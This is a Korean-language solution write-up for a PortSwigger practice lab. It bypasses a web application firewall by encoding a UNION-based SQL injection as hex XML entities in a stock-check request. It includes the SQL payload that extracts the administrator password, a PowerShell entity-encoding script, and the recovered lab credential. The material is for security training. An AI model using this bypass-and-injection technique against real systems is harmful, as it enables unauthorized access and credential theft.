---
title: "SQL injection with filter bypass via XML encoding"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding"
difficulty: Practitioner
note_kind: solution
draft: false
---

# SQL injection with filter bypass via XML encoding

## 문제 조건과 설명

이 실습의 입력 지점은 앞선 상품 카테고리 필터가 아니라 **재고 확인 기능**이다. 공식 설명은 이 기능에 SQL injection 취약점이 있으며, 조회 결과가 애플리케이션 응답에 표시된다고 알려 준다. 따라서 `UNION`으로 다른 테이블의 데이터를 조회 결과에 합쳐 읽을 수 있다.

**주어진 데이터와 목표**

데이터베이스에는 등록 사용자의 이름과 비밀번호를 담은 `users` 테이블이 있다. 다만 공식 설명은 재고 확인 요청의 실제 형식, 원래 조회의 열 수, 계정 정보가 화면의 어느 위치에 나타날지, 관리자 비밀번호 값을 알려 주지 않는다. **완료 조건은 SQL injection으로 관리자 계정의 자격 증명을 얻고, 그 계정으로 로그인하는 것**이다. `UNION` 결과가 화면에 보이는 것과 관리자 로그인이 끝난 것은 별도로 확인해야 한다.

**제목이 알려 주는 우회 과제**

제목은 **XML 인코딩을 이용한 필터 우회**를 예고한다. 하지만 문제 본문만으로는 요청이 어떤 XML 구조인지, 어떤 문자나 표현이 차단되는지, 인코딩된 값이 서버의 어느 단계에서 해석되는지 알 수 없다. 먼저 재고 확인 요청의 본문과 응답을 관찰하고, 입력이 필터를 통과하는 형태와 SQL에 전달될 때의 의미를 구분해야 한다. 제목만 보고 특정 인코딩 문자열이 동작했다고 기록해서는 안 된다.

재고 조회의 정상 응답을 기준으로 삼은 뒤, 입력 표현을 바꿨을 때 차단·SQL 오류·결과 출력이 각각 어떻게 달라지는지 비교하는 순서가 타당하다. 우회 가능성이 확인되어도 `UNION`이 요구하는 반환 열 수와 문자열 출력 위치를 맞춰야 계정 값을 읽을 수 있다. 아래에는 실제 요청 형식과 관찰된 응답을 확인한 후 단계별 판단을 이어서 적는다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## 탐색 및 풀이 기록

### 초기 관찰

재고 확인은 `POST /product/stock`으로 XML 본문을 보낸다. `<productId>2</productId>`를 유지하고 `<storeId>`만 바꿔 비교했다.

~~~xml
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
~~~

`storeId`가 `1`이면 `878 units`, `2`이면 `679 units`였다. `1+1`도 `679 units`를 반환했다. 매장 번호를 단순 문자열이 아닌 식으로 평가한다는 단서다.

### 실행 과정

#### 원문은 차단되고 XML 엔터티는 통과

`<storeId>1 UNION SELECT NULL</storeId>`을 그대로 보내자 HTTP 403과 `"Attack detected"`가 왔다. 같은 문자열의 **각 문자를 16진 XML 숫자 엔터티**로 바꾸어 보내자 HTTP 200과 `878 units` 다음 줄의 `null`이 나왔다. 예를 들어 `U`는 `&#x55;`, 공백은 `&#x20;`로 표현할 수 있다. WAF가 차단한 원문과 달리 인코딩된 XML은 처리됐고, 해석된 값이 SQL 조회에 사용된 것으로 확인했다.

인코딩한 `1 UNION SELECT NULL,NULL`에는 `0 units`가 반환됐다. 한 열을 추가하는 `UNION SELECT NULL`은 출력되고 두 열은 실패했으므로 원래 조회 결과는 **한 열**로 판단했다.

#### 사용자 이름과 비밀번호를 한 열에 합치기

조회 결과가 한 열이므로 `username`과 `password`를 `:`로 연결했다. `administrator` 행만 가져오도록 조건을 걸었다.

~~~sql fragment
1 UNION SELECT username || ':' || password
FROM users WHERE username='administrator'
~~~

PowerShell에서 위 문자열을 문자별 XML 엔터티로 바꾸고 `<storeId>`에 넣었다. 나머지 XML 구조와 `Content-Type: application/xml`은 원래 요청을 유지했다.

~~~powershell
$sql = "1 UNION SELECT username || ':' || password FROM users WHERE username='administrator'"
$encoded = -join ($sql.ToCharArray() |
    ForEach-Object { '&#x{0:X};' -f [int][char]$_ })
$body = "<stockCheck><productId>2</productId><storeId>$encoded</storeId></stockCheck>"
~~~

응답은 HTTP 200이었고 재고 수량 아래에 관리자 계정 정보가 추가됐다.

~~~text
878 units
administrator:4x6285hvha1pcbgbfht2
~~~

얻은 비밀번호로 로그인 요청을 보낸 뒤 `/my-account`에서 `Your username is: administrator`를 확인했다. 이어 첫 화면에 실습 완료 배너가 표시됐다.

## 최종 결과

XML 숫자 엔터티로 필터를 우회해 한 열짜리 `UNION` 결과에서 관리자 자격 증명을 읽었다. `administrator`로 로그인했고 `Congratulations, you solved the lab!` 배너를 확인했다.

## 배운 점

이 실습은 결과가 응답에 표시되므로 블라인드 SQL 인젝션과 달리 `UNION` 출력 위치를 바로 활용할 수 있었다. 원문 `UNION SELECT`는 차단됐지만 같은 문자를 XML 엔터티로 표현하면 요청이 통과했다. **필터가 검사하는 표현과 XML 해석 후 SQL에 전달되는 값이 달라질 수 있음**을 정상 재고, 산술식, 차단 응답, 인코딩된 `UNION` 응답으로 구분해 확인했다.

## 관련 개념

- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
- [UNION 기반 SQL 인젝션으로 테이블과 열 찾기](../../concepts/sql-injection-union-workflow.md)
